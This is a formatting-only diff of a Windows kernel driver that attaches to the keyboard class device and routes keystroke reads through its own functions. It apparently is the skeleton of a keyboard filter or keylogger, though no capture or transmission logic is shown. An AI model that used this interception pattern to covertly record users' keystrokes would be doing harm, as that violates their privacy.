@@ -21,8 +21,10 @@ PDEVICE_OBJECT myKeyboardDevice = NULL;
 
 ULONG pendingKey = 0;
 
-VOID DriverUnload(
-    _In_ PDRIVER_OBJECT pDriverObject)
+VOID
+DriverUnload(
+    _In_ PDRIVER_OBJECT pDriverObject
+)
 {
     LARGE_INTEGER interval = {0};
     interval.QuadPart = -10 * 1000 * 1000;
@@ -44,7 +46,8 @@ VOID DriverUnload(
 NTSTATUS
 DriverPassthrough(
     _In_ PDEVICE_OBJECT pDeviceObject,
-    _In_ PIRP pIrp)
+    _In_ PIRP pIrp
+)
 {
     IoCopyCurrentIrpStackLocationToNext(pIrp);
 
@@ -55,7 +58,8 @@ NTSTATUS
 ReadOperationFinished(
     _In_ PDEVICE_OBJECT pDeviceObject,
     _In_ PIRP pIrp,
-    _In_ PVOID context)
+    _In_ PVOID context
+)
 {
     UNREFERENCED_PARAMETER(pDeviceObject);
     UNREFERENCED_PARAMETER(context);
@@ -88,7 +92,8 @@ ReadOperationFinished(
 NTSTATUS
 DriverReadKeystrokes(
     _In_ PDEVICE_OBJECT pDeviceObject,
-    _In_ PIRP pIrp)
+    _In_ PIRP pIrp
+)
 {
     IoCopyCurrentIrpStackLocationToNext(pIrp);
 
@@ -101,7 +106,8 @@ DriverReadKeystrokes(
 
 NTSTATUS
 DriverAttachKeyboard(
-    _In_ PDRIVER_OBJECT pDriverObject)
+    _In_ PDRIVER_OBJECT pDriverObject
+)
 {
     NTSTATUS Status;
     UNICODE_STRING TargetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
@@ -131,7 +137,8 @@ DriverAttachKeyboard(
 NTSTATUS
 DriverEntry(
     _In_ PDRIVER_OBJECT pDriverObject,
-    _In_ PUNICODE_STRING pRegistryPath)
+    _In_ PUNICODE_STRING pRegistryPath
+)
 {
     UNREFERENCED_PARAMETER(pRegistryPath);
 
